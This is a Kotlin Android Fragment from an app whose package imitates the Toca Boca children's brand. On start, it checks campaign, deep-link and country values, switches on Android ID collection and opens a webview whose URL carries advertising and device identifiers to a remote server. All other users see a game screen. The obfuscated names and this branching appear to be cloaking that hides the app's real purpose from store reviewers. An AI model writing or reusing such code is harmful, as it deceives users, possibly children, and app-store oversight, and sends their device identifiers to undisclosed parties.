package com.tocaboca.tocalifeworlde

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.tocaboca.tocalifeworlde.Util.ad_id
import com.tocaboca.tocalifeworlde.Util.apps
import com.tocaboca.tocalifeworlde.Util.aps_id
import com.tocaboca.tocalifeworlde.Util.codeCode
import com.tocaboca.tocalifeworlde.Util.geoCo
import com.tocaboca.tocalifeworlde.Util.instId
import com.tocaboca.tocalifeworlde.Util.keyVAl
import com.tocaboca.tocalifeworlde.Util.linkaa
import com.tocaboca.tocalifeworlde.Util.myId
import com.tocaboca.tocalifeworlde.Util.namm
import com.tocaboca.tocalifeworlde.Util.one
import com.tocaboca.tocalifeworlde.Util.paccckk
import com.tocaboca.tocalifeworlde.Util.subFive
import com.tocaboca.tocalifeworlde.Util.subFour
import com.tocaboca.tocalifeworlde.Util.subOne
import com.tocaboca.tocalifeworlde.Util.subSix
import com.tocaboca.tocalifeworlde.Util.trololo
import com.tocaboca.tocalifeworlde.Util.urlMain
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FiilterrraaaFragment : Fragment() {
    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fiilterrraaa, container, false)
    }

    override fun onStart() {
        super.onStart()

        val count = shareP.getString(geoCo, null)
        val appCamp = shareP.getString("appCamp", null)
        val deepSt = shareP.getString("deepSt", null)
        val countryDev = shareP.getString(codeCode, null)
        val apps = shareP.getString(apps, null)
        val wv = shareP.getString(urlMain, null)
        val mainId = shareP.getString("mainId", null)
        val pack = paccckk
        val buildVers = Build.VERSION.RELEASE
        val myTrId = shareP.getString(myId, null)
        val myInstId: String? = shareP.getString(instId, null)

        val intentBeam = Intent(activity, VebbbbbibiibiiActivity2::class.java)
        val intentGame = Intent(activity, GaammymymymhmdefActivity2::class.java)

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_id, afId).apply()

        val linkApps = "$wv$subOne$appCamp&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkMT = "$wv$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$namm"
        val linkFB = "$wv$subOne$deepSt&$one$afId&$ad_id$mainId&$subFour$pack&$subFive$buildVers&$subSix$trololo"
        val linkFBNullApps = "$wv$subOne$deepSt&$one$myTrId&$ad_id$myInstId&$subFour$pack&$subFive$buildVers&$subSix$trololo"

        when(apps) {
            "1" ->
                if(appCamp!="null") {
                    shareP.edit().putString(linkaa, linkApps).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (deepSt!=null||countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(linkaa, linkFB).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
            "0" ->
                if(deepSt!=null) {
                    shareP.edit().putString(linkaa, linkFBNullApps).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else if (countryDev!!.contains(count.toString())) {
                    shareP.edit().putString(linkaa, linkMT).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeam)
                    activity?.finish()
                } else {
                    startActivity(intentGame)
                    activity?.finish()
                }
        }
    }
}